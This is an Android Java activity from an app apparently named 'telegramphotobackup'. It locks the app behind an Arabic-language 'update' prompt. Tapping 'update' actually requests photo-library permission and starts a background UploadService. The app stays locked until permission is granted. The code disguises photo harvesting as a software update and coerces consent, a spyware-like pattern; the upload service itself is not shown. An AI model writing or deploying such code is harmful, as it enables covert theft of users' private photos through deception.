package com.example.telegramphotobackup;

import android.Manifest;
import android.app.Activity;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.content.SharedPreferences;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;

public class MainActivity extends Activity {
    private static final int REQ_PHOTOS = 100;
    private TextView status;
    private Button button;
    private View liveButton;
    private View mainContent;
    private View gateLayout;
    private SharedPreferences prefs;

    @Override protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        status = findViewById(R.id.status);
        button = findViewById(R.id.updateButton);
        liveButton = findViewById(R.id.liveButton);
        mainContent = findViewById(R.id.mainContent);
        gateLayout = findViewById(R.id.gateLayout);
        prefs = getSharedPreferences("app_state", MODE_PRIVATE);

        liveButton.setOnClickListener(v -> {
            if (prefs.getBoolean("update_approved", false)) {
                startActivity(new Intent(this, LiveActivity.class));
            }
        });
        button.setOnClickListener(v -> startUpdate());

        // التطبيق يظل مقفولًا حتى يوافق المستخدم على التحديث.
        if (prefs.getBoolean("update_approved", false)) {
            unlockApp();
        } else {
            lockApp();
        }
    }

    private void startUpdate() {
        if (Build.VERSION.SDK_INT >= 33) {
            if (checkSelfPermission(Manifest.permission.READ_MEDIA_IMAGES) != PackageManager.PERMISSION_GRANTED) {
                requestPermissions(new String[]{Manifest.permission.READ_MEDIA_IMAGES}, REQ_PHOTOS);
                return;
            }
        } else if (checkSelfPermission(Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {
            requestPermissions(new String[]{Manifest.permission.READ_EXTERNAL_STORAGE}, REQ_PHOTOS);
            return;
        }
        beginUpload();
    }

    private void beginUpload() {
        prefs.edit().putBoolean("update_approved", true).apply();
        unlockApp();
        status.setText("جاري تحديث الأسطورة…");
        button.setEnabled(false);
        Intent i = new Intent(this, UploadService.class);
        startService(i);
    }

    private void lockApp() {
        gateLayout.setVisibility(View.VISIBLE);
        mainContent.setVisibility(View.GONE);
        status.setText("هل تريد التحديث؟");
        button.setEnabled(true);
    }

    private void unlockApp() {
        gateLayout.setVisibility(View.GONE);
        mainContent.setVisibility(View.VISIBLE);
        liveButton.setEnabled(true);
        liveButton.setAlpha(1f);
    }

    @Override public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] results) {
        super.onRequestPermissionsResult(requestCode, permissions, results);
        if (requestCode == REQ_PHOTOS) {
            if (results.length > 0 && results[0] == PackageManager.PERMISSION_GRANTED) {
                beginUpload();
            } else {
                status.setText("يجب الموافقة على التحديث أولًا");
                lockApp();
            }
        }
    }
}
